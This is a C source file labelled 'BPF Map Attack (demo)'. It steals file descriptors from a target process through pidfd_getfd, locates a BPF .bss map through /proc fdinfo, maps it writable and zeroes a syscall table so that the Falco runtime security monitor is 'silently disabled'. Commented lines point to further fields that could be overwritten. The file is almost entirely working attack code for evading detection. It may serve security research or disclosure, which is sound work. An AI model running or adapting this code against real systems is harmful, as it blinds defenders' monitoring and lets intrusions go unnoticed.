#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include "common.h"

#define INTERESTING_TABLE_OFFSET 8
#define SYSCALL_TABLE_SIZE 512
#define MAX_SCAN_FD 1024

int bss_size;


int match_fdinfo(int fd) {
    char path[64], line[256];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", fd);

    FILE *f = fopen(path, "r");
    if (!f) return 0;

    int map_type = -1, max_entries = -1, value_size = -1;
    unsigned int map_flags = 0;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "map_type:\t%d", &map_type) == 1) continue;
        if (sscanf(line, "value_size:\t%d", &value_size) == 1) continue;
        if (sscanf(line, "max_entries:\t%d", &max_entries) == 1) continue;
        if (sscanf(line, "map_flags:\t0x%x", &map_flags) == 1) continue;
    }
    fclose(f);
    bss_size = value_size;
    return (
            map_type == 2  &&
            max_entries == 1 &&
            (map_flags & 0x400)
    );
}

int main(int argc, char **argv) {
    printf("------------------------BPF Map Attack (demo)------------------------\n");
    if (argc != 2) {
        fprintf(stderr, "usage: %s <target-pid>\n", argv[0]);
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);
    int pidfd = pidfd_open(target_pid);
    if (pidfd < 0) {
        perror("pidfd_open");
        return 1;
    }

    for (int i = 0; i < MAX_SCAN_FD; i++) {
        int fd = pidfd_getfd(pidfd, i);
        if (fd < 0) continue;

        if (match_fdinfo(fd)) {
            printf("found likely .bss map: remote fd %d -> local fd %d\n", i, fd);

            void *bss = mmap(NULL, bss_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
            if (bss == MAP_FAILED) {
                perror("mmap failed");
                close(fd);
                continue;
            }

            // we are targeting g_64bit_interesting_syscalls_table, there are SYSCALL_TABLE_SIZE possible entries so we zero them out
            memset((char *)bss + INTERESTING_TABLE_OFFSET, 0, SYSCALL_TABLE_SIZE);
            // here you can also mess with other data...
            //memset((char *)bss + 520, 1 << 2, SYSCALL_TABLE_SIZE);
            //memset((char *)bss + 3080 + 12, 0, 1);
            //memset((char *)bss + 3112, 1, 1);
            printf("falco silently disabled.\n");
            munmap(bss, bss_size);
            close(fd);
            break;
        }

        close(fd);
    }

    close(pidfd);
    return 0;
}
